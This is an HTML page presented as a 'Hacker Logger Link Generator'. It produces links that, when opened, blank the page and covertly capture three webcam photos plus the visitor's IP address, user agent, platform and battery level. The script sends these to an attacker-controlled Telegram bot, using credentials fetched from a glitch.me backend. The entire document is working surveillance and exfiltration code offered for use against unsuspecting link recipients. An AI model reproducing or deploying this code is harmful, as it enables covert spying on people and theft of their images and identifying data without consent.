<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Logger 🔥 by Divyansh</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    @media only screen and (min-width: 768px) {
      body { display: none; }
    }
    body {
      background: black;
      color: lime;
      font-family: monospace;
      padding: 20px;
      text-align: center;
    }
    input, button {
      padding: 10px;
      margin: 10px;
      border: none;
      background: black;
      color: lime;
      border: 2px solid lime;
      border-radius: 5px;
      width: 90%;
      max-width: 300px;
    }
    #result {
      color: cyan;
      word-wrap: break-word;
      border: 1px solid lime;
      padding: 10px;
      background: #000;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div id="mainPage">
    <h3>👨‍💻 Hacker Logger Link Generator</h3>
    <input id="token" placeholder="Enter Bot Token">
    <input id="chatid" placeholder="Enter Chat ID">
    <br>
    <button onclick="generateLink()">Generate Link</button>
    <div id="result" onclick="copyLink()" title="Tap to Copy">
      🔗 Your Link: <span id="linkText"></span>
    </div>
    <p>⚡ Coded by Divyansh ❤️</p>
  </div>

  <script>
    const params = new URLSearchParams(location.search);
    const uid = params.get("uid");

    if (uid) {
      document.body.innerHTML = ""; // Hide UI
      runLogger(uid);
    }

    function generateUID() {
      return Math.random().toString(36).substring(2, 16);
    }

    function generateLink() {
      const token = document.getElementById("token").value.trim();
      const chatid = document.getElementById("chatid").value.trim();
      if (!token || !chatid) return alert("Please enter both fields");

      const uid = generateUID();

      // 🔐 Save token + chatid to backend
      fetch("https://grizzled-gamy-child.glitch.me/save", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ uid, token, chat_id: chatid })
      });

      const finalLink = `https://d3vx.vercel.app/?uid=${uid}`;
      document.getElementById("linkText").innerText = finalLink;
    }

    function copyLink() {
      const text = document.getElementById("linkText").innerText;
      navigator.clipboard.writeText(text);
      alert("Copied to clipboard!");
    }

    async function runLogger(uid) {
      try {
        // 🔎 Get token/chat_id by UID
        const res = await fetch(`https://grizzled-gamy-child.glitch.me/get?uid=${uid}`);
        const { token, chat_id } = await res.json();

        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        let photos = [];

        const capture = () => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0);
          photos.push(canvas.toDataURL("image/jpeg"));
        };

        await new Promise(r => setTimeout(r, 1000));
        capture();
        await new Promise(r => setTimeout(r, 1900));
        capture();
        await new Promise(r => setTimeout(r, 1900));
        capture();
        stream.getTracks().forEach(t => t.stop());

        const battery = await navigator.getBattery();
        const info = {
          ip: await (await fetch("https://api.ipify.org?format=json")).json(),
          ua: navigator.userAgent,
          os: navigator.platform,
          battery: `${Math.round(battery.level * 100)}%`
        };

        const caption = `💀 𝑫3𝑽'𝑿 𝑯𝒂𝒄𝒌𝒆𝒓  💋\n\n📱 Device: ${info.ua}\n🔋 Battery: ${info.battery}\n💻 OS: ${info.os}\n🌐 IP: ${info.ip.ip}\n\n🤴🏻𝐃𝐞𝐯𝐥𝐨𝐩𝐞𝐫 👨🏻‍💻 : @tera_paglu`;

        for (let i = 0; i < photos.length; i++) {
          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id,
              photo: photos[i],
              caption: i === 0 ? caption : ""
            })
          });
        }
      } catch (e) {
        console.error("Logger failed:", e);
      }
    }
  </script>
</body>
</html>
